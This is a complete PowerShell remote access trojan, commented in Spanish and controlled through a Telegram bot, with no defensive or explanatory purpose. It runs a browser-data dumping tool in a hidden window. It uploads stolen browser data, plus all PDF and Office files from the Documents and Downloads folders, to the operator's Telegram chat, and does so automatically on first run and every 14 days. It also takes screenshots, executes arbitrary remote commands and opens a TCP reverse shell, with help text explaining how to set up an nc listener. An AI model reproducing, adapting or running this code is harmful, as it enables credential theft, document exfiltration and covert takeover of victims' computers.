param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === CONFIGURACION ===
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = "$env:APPDATA\CarpetaDos\bot.log"
$HackPath = "$env:APPDATA\CarpetaDos\hackbrowserdata.exe"
$StateFile = "$env:APPDATA\CarpetaDos\bot_state.json"

# Variables de sesion
$script:CurrentDir = $PWD.Path
$script:LastStealTime = $null
$script:ProcessedUpdates = @{}
$script:Lock = New-Object System.Object
$script:ReverseShellActive = $false
$script:ShellClient = $null
$script:ShellStream = $null
$script:FilesExfiltrated = $false

# Crear directorio
New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

# === FUNCIONES BASICAS ===
function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    try { Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue } catch {}
    Write-Host $line
}

function Send-Message {
    param([string]$Text)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Error mensaje: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param([string]$Path, [string]$Caption = "")
    try {
        if (-not (Test-Path $Path)) { return $false }
        
        $args = @(
            "-s", "-X", "POST",
            "https://api.telegram.org/bot$Token/sendDocument",
            "-F", "chat_id=$ChatId",
            "-F", "document=@$Path"
        )
        if ($Caption) { $args += "-F", "caption=$Caption" }
        
        $result = & curl.exe @args 2>&1 | ConvertFrom-Json
        if ($result.ok) {
            Write-Log "Archivo enviado: $(Split-Path $Path -Leaf)"
            return $true
        }
        return $false
    } catch {
        Write-Log "Error archivo: $($_.Exception.Message)"
        return $false
    }
}

# === INFO DEL SISTEMA ===
function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    try {
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
    } catch { $os = "Windows" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

# === SCREENSHOT ===
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        
        $path = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'HH:mm:ss')"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-Message -Text "Error capturando: $($_.Exception.Message)"
        return $false
    }
}

# === STEAL BROWSER DATA ===
function Steal-Data {
    param([switch]$Auto = $false)
    
    if (-not (Test-Path $HackPath)) {
        if (-not $Auto) { Send-Message -Text "Error: hackbrowserdata.exe no encontrado" }
        return $false
    }
    
    if (-not $Auto) { Send-Message -Text "Extrayendo datos..." }
    Write-Log "Iniciando extraccion"
    
    $existing = Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
    
    $outDir = "$env:TEMP\br_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    
    $success = $false
    try {
        $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
        $p.WaitForExit(120000)
        if (-not $p.HasExited) { $p.Kill() }
        
        Start-Sleep -Seconds 2
        Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
            try { $_.Kill() } catch {}
        }
        
        $files = Get-ChildItem $outDir -Filter "*.json" -Recurse
        if ($files) {
            if (-not $Auto) { Send-Message -Text "Enviando $($files.Count) archivos..." }
            $sent = 0
            foreach ($f in $files) {
                $zip = "$env:TEMP\$($f.BaseName).zip"
                Compress-Archive -Path $f.FullName -DestinationPath $zip -Force
                if (Send-File -Path $zip -Caption $f.BaseName) { $sent++ }
                Remove-Item $zip -Force -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 1
            }
            if (-not $Auto) { Send-Message -Text "Completado: $sent/$($files.Count)" }
            Write-Log "Enviados $sent archivos"
            $success = $true
        }
        
        $script:LastStealTime = Get-Date
        Save-State
        
    } finally {
        if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
    }
    
    return $success
}

# === EXFILTRACION DE DOCUMENTOS (PRIORIDAD: DOCUMENTOS PRIMERO) ===
function Exfiltrate-Documents {
    param([switch]$Auto = $false)
    
    if ($script:FilesExfiltrated -and $Auto) {
        Write-Log "Documentos ya exfiltrados anteriormente, saltando..."
        return
    }
    
    if (-not $Auto) { Send-Message -Text "Iniciando exfiltracion de documentos..." }
    Write-Log "Iniciando exfiltracion de documentos"
    
    # Obtener rutas automaticamente
    $RutaDocumentos = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
    $RutaDescargas = Join-Path $env:USERPROFILE "Downloads"
    $RutaDescargasES = Join-Path $env:USERPROFILE "Descargas"
    
    # Extensiones a buscar
    $Extensiones = @('*.pdf', '*.docx', '*.doc', '*.xlsx', '*.xls', '*.pptx', '*.ppt')
    
    Send-Message -Text "Buscando archivos... (Prioridad: DOCUMENTOS primero)"
    
    $archivosDocumentos = @()
    $archivosDescargas = @()
    
    # ========== PRIORIDAD 1: DOCUMENTOS ==========
    if (Test-Path $RutaDocumentos) {
        try {
            $found = Get-ChildItem -Path $RutaDocumentos -Include $Extensiones -Recurse -File -ErrorAction SilentlyContinue
            $archivosDocumentos += $found
            Write-Log "Encontrados $($found.Count) archivos en Documentos: $RutaDocumentos"
        } catch { Write-Log "Error buscando en Documentos: $_" }
    }
    
    # ========== PRIORIDAD 2: DESCARGAS ==========
    $rutasDescargas = @($RutaDescargas, $RutaDescargasES) | Where-Object { Test-Path $_ }
    foreach ($ruta in $rutasDescargas) {
        try {
            $found = Get-ChildItem -Path $ruta -Include $Extensiones -Recurse -File -ErrorAction SilentlyContinue
            $archivosDescargas += $found
            Write-Log "Encontrados $($found.Count) archivos en Descargas: $ruta"
        } catch { Write-Log "Error buscando en $ruta`: $_" }
    }
    
    $totalArchivos = $archivosDocumentos.Count + $archivosDescargas.Count
    
    if ($totalArchivos -eq 0) {
        Send-Message -Text "No se encontraron archivos PDF, Word, Excel o PowerPoint."
        $script:FilesExfiltrated = $true
        Save-State
        return
    }
    
    Send-Message -Text "Total encontrados: $totalArchivos (Documentos: $($archivosDocumentos.Count), Descargas: $($archivosDescargas.Count)). Enviando de uno en uno..."
    
    $enviados = 0
    $errores = 0
    
    # ========== ENVIAR DOCUMENTOS PRIMERO (PRIORIDAD ALTA) ==========
    if ($archivosDocumentos.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO CARPETA DOCUMENTOS (PRIORIDAD) ==="
        foreach ($archivo in $archivosDocumentos | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [Documentos] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
            
            Write-Log "Enviando: $($archivo.FullName)"
            
            if (Send-File -Path $archivo.FullName -Caption $caption) {
                Write-Log "OK: $($archivo.Name)"
            } else {
                Write-Log "ERROR: $($archivo.Name)"
                $errores++
            }
            
            Start-Sleep -Seconds 2
        }
    }
    
    # ========== LUEGO ENVIAR DESCARGAS ==========
    if ($archivosDescargas.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO CARPETA DESCARGAS ==="
        foreach ($archivo in $archivosDescargas | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [Descargas] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
            
            Write-Log "Enviando: $($archivo.FullName)"
            
            if (Send-File -Path $archivo.FullName -Caption $caption) {
                Write-Log "OK: $($archivo.Name)"
            } else {
                Write-Log "ERROR: $($archivo.Name)"
                $errores++
            }
            
            Start-Sleep -Seconds 2
        }
    }
    
    $script:FilesExfiltrated = $true
    Save-State
    
    Send-Message -Text "Exfiltracion completada.`nTotal: $totalArchivos`nEnviados: $($enviados - $errores)`nErrores: $errores"
    Write-Log "Exfiltracion completada. Exitosos: $($enviados - $errores), Errores: $errores"
}

# === REVERSE SHELL ===
function Start-ReverseShell {
    param([string]$IPAddress, [int]$Port = 4444)
    
    try {
        Send-Message -Text "Conectando reverse shell a $IPAddress`:$Port ..."
        Write-Log "Iniciando reverse shell a $IPAddress`:$Port"
        
        $script:ReverseShellActive = $true
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        $script:ShellClient = $client
        $stream = $client.GetStream()
        $script:ShellStream = $stream
        
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("=== Reverse Shell Conectado ===")
        $writer.WriteLine("Usuario: $env:USERNAME")
        $writer.WriteLine("Equipo: $env:COMPUTERNAME")
        $writer.WriteLine("Directorio: $(Get-Location)")
        $writer.WriteLine("===============================")
        
        Send-Message -Text "Reverse shell conectado a $IPAddress`:$Port. Escribe 'exit' para salir o /stopshell desde Telegram."
        
        while ($script:ReverseShellActive -and $client.Connected) {
            $writer.Write("PS $(Get-Location)> ")
            try {
                $command = $reader.ReadLine()
                if ($command -eq "exit" -or $command -eq "quit") { break }
                
                if (-not [string]::IsNullOrWhiteSpace($command)) {
                    try {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                        $writer.WriteLine($output)
                    } catch {
                        $writer.WriteLine("Error: $_")
                    }
                }
            } catch { break }
        }
    } catch {
        Send-Message -Text "Error reverse shell: $_"
        Write-Log "Error reverse shell: $_"
    } finally {
        if ($script:ShellStream) { $script:ShellStream.Close() }
        if ($script:ShellClient) { $script:ShellClient.Close() }
        $script:ReverseShellActive = $false
        Send-Message -Text "Reverse shell desconectado."
        Write-Log "Reverse shell desconectado"
    }
}

function Stop-ReverseShell {
    $script:ReverseShellActive = $false
    if ($script:ShellStream) { $script:ShellStream.Close() }
    if ($script:ShellClient) { $script:ShellClient.Close() }
    Send-Message -Text "Reverse shell detenido manualmente."
    Write-Log "Reverse shell detenido manualmente"
}

# === EJECUTAR COMANDO CON SESION PERSISTENTE ===
function Run-Command {
    param([string]$Cmd)
    
    Write-Log "Ejecutando: $Cmd (en: $script:CurrentDir)"
    
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c $Cmd && cd"
        $psi.WorkingDirectory = $script:CurrentDir
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()
        
        if ($Cmd -match '^cd\s+(.+)$') {
            $newPath = $Matches[1]
            $testPath = if ([System.IO.Path]::IsPathRooted($newPath)) { $newPath } else { Join-Path $script:CurrentDir $newPath }
            $resolved = Resolve-Path $testPath -ErrorAction SilentlyContinue
            if ($resolved) {
                $script:CurrentDir = $resolved.Path
                Send-Message -Text "Directorio: $script:CurrentDir"
                return
            }
        }
        
        $output = $stdout + $stderr
        if ([string]::IsNullOrWhiteSpace($output)) { $output = "(sin salida)" }
        
        $temp = "$env:TEMP\cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        "Comando: $Cmd`nDir: $script:CurrentDir`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output" | Out-File $temp -Encoding UTF8
        
        Send-File -Path $temp -Caption "Salida: $Cmd"
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-Message -Text "Error: $($_.Exception.Message)"
    }
}

# === ESTADO Y AUTOMATIZACION ===
function Save-State {
    $state = @{
        LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
        FilesExfiltrated = $script:FilesExfiltrated
    }
    $state | ConvertTo-Json | Out-File $StateFile -Encoding UTF8
}

function Load-State {
    if (Test-Path $StateFile) {
        try {
            $state = Get-Content $StateFile | ConvertFrom-Json
            if ($state.LastStealTime) {
                $script:LastStealTime = [DateTime]::Parse($state.LastStealTime)
            }
            if ($state.FilesExfiltrated -ne $null) {
                $script:FilesExfiltrated = $state.FilesExfiltrated
            }
        } catch {}
    }
}

function Check-AutoSteal {
    $now = Get-Date
    $shouldSteal = $false
    
    if (-not $script:LastStealTime) {
        Write-Log "Primera ejecucion - extrayendo datos..."
        $shouldSteal = $true
    } elseif (($now - $script:LastStealTime).Days -ge 14) {
        Write-Log "Han pasado 14 dias - extrayendo datos..."
        $shouldSteal = $true
    }
    
    if ($shouldSteal) {
        $stealSuccess = Steal-Data -Auto
        Start-Sleep -Seconds 3
        Exfiltrate-Documents -Auto
    } elseif (-not $script:FilesExfiltrated) {
        Write-Log "Exfiltrando documentos pendientes..."
        Exfiltrate-Documents -Auto
    }
}

# === PROCESAR COMANDOS ===
function Process-Cmd {
    param([string]$Text, [int]$UpdateId)
    
    [void][System.Threading.Monitor]::Enter($script:Lock)
    try {
        if ($script:ProcessedUpdates.ContainsKey($UpdateId)) { return }
        $script:ProcessedUpdates[$UpdateId] = $true
        
        if ($script:ProcessedUpdates.Count -gt 100) {
            $keys = $script:ProcessedUpdates.Keys | Sort-Object | Select-Object -First 50
            foreach ($k in $keys) { $script:ProcessedUpdates.Remove($k) }
        }
    } finally {
        [System.Threading.Monitor]::Exit($script:Lock)
    }
    
    Write-Log "Procesando: $Text"
    $parts = $Text.Trim() -split '\s+', 2
    $cmd = $parts[0].ToLower()
    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    
    switch ($cmd) {
        "/help" {
            Send-Message -Text @"
Comandos disponibles:

/help - Muestra esta ayuda
/info - Info del sistema
/ls - Listar archivos
/cd <ruta> - Cambiar directorio
/pwd - Directorio actual
/cmd <comando> - Ejecutar comando
/captura - Screenshot
/steal - Extraer datos navegadores
/files - Exfiltrar documentos (PDF, Word, Excel, PPT)
/shell <IP> [puerto] - Reverse shell (default: 4444)
/stopshell - Detener reverse shell activo

REVERSE SHELL:
1. En tu maquina: nc -lvnp 4444
2. Aqui: /shell TU_IP 4444
3. Control remoto interactivo
4. Escribe 'exit' o /stopshell para cerrar
"@
        }
        
        "/info" { Send-Message -Text (Get-Info) }
        
        "/ls" {
            try {
                $items = Get-ChildItem $script:CurrentDir | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $script:CurrentDir`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        "/pwd" { Send-Message -Text "Directorio: $script:CurrentDir" }
        
        "/cd" {
            if ($args) {
                Run-Command -Cmd "cd $args"
            } else {
                Send-Message -Text "Uso: /cd <ruta>"
            }
        }
        
        "/cmd" {
            if ($args) {
                Run-Command -Cmd $args
            } else {
                Send-Message -Text "Uso: /cmd <comando>"
            }
        }
        
        "/captura" {
            Send-Message -Text "Capturando..."
            Take-Screenshot | Out-Null
        }
        
        "/steal" { Steal-Data }
        
        "/files" { Exfiltrate-Documents }
        
        "/shell" {
            if ($script:ReverseShellActive) {
                Send-Message -Text "Ya hay un reverse shell activo. Usa /stopshell primero."
                return
            }
            
            $shellArgs = $args -split '\s+'
            $ip = $shellArgs[0]
            $port = if ($shellArgs.Count -gt 1) { [int]$shellArgs[1] } else { 4444 }
            
            if ([string]::IsNullOrWhiteSpace($ip)) {
                Send-Message -Text "Uso: /shell <IP> [puerto]`nEjemplo: /shell 192.168.1.100 4444`n`nPrimero ejecuta en tu maquina:`nnc -lvnp 4444"
                return
            }
            
            Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $ip, $port | Out-Null
            Start-Sleep -Seconds 2
            
            if ($script:ReverseShellActive) {
                Send-Message -Text "Reverse shell conectado a $ip`:$port"
            } else {
                Send-Message -Text "Intentando conectar a $ip`:$port ... Espera unos segundos."
            }
        }
        
        "/stopshell" { Stop-ReverseShell }
        
        default { Write-Log "Comando desconocido: $cmd" }
    }
}

# === INICIO ===
Write-Log "=== BOT INICIADO ==="

Load-State

Send-Message -Text "Bot online - $(Get-Info)"

Check-AutoSteal

try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
} catch {}

$lastId = 0
while ($true) {
    try {
        $resp = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId+1)&limit=1" -TimeoutSec 60
        
        if ($resp.ok -and $resp.result.Count -gt 0) {
            $upd = $resp.result[0]
            $lastId = $upd.update_id
            
            if ($upd.message -and $upd.message.text -and ([string]$upd.message.chat.id -eq $ChatId)) {
                Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id
            }
        }
        
        if ((Get-Date).Minute -eq 0) {
            Check-AutoSteal
        }
        
    } catch {
        $err = $_.Exception.Message
        if ($err -notlike "*409*") {
            Write-Log "Error: $err"
        }
        Start-Sleep -Seconds 2
    }
    
    Start-Sleep -Milliseconds 1500
}
